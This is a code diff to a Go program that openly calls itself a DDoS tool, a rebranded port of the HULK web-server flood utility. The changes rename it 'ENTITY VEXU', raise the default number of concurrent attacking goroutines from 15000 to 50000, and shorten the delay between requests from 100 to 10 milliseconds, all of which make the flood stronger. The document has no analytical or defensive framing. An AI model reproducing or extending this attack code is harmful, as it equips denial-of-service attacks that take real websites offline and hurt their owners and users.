@@ -1,7 +1,7 @@
 package main
 
 /*
- Entity Vexu DDoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
+ ENTITY VEXU DDoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
  Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
  This go program licensed under GPLv3.
  Copyright Blackout Dominion <blackout.dominion@proton.me>
@@ -23,7 +23,7 @@ import (
 	"time"
 )
 
-const __version__  = "2.0.0"
+const __version__  = "3.0.0"
 
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
@@ -90,7 +90,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 15000
+		maxproc = 50000
 	}
 
 	u, err := url.Parse(site)
@@ -145,7 +145,7 @@ func main() {
 			case targetComplete:
 				sent++
 				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK DDoS Attack Finished --       \n\n\r")
+				fmt.Println("\r-- ENTITY VEXU Super DDoS Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
 		}
@@ -214,7 +214,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 				s <- targetComplete
 			}
 		}
-		time.Sleep(time.Millisecond * 100)
+		time.Sleep(time.Millisecond * 10)
 	}
 }
 
